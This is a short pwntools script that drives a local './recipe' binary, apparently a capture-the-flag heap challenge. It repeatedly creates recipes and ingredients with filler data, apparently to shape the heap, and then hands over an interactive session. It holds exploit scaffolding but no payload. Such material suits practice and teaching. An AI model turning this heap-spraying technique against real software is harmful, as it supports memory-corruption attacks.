from pwn import *

# context.log_level = 'debug'

r = process('./recipe')

def create_recipe():
	# r.sendlineafter('> ', 'c')
	# r.sendlineafter('Recipe name: ', 'a')
	# r.sendlineafter('Recipe description: ', 'b')

	r.sendline('c')
	r.sendline('a' * 0x8)
	r.sendline('b' * 0x18)

	for i in range(0x10):
		# r.sendlineafter('> ', 'a')
		# r.sendlineafter('Ingredient name: ', 'c')
		# r.sendlineafter('Ingredient amount: ', '1')

		r.sendline('a')
		r.sendline('c' * 0x8)
		r.sendline(str(0x12345678))

for i in range(0x21):
	create_recipe()

r.interactive()
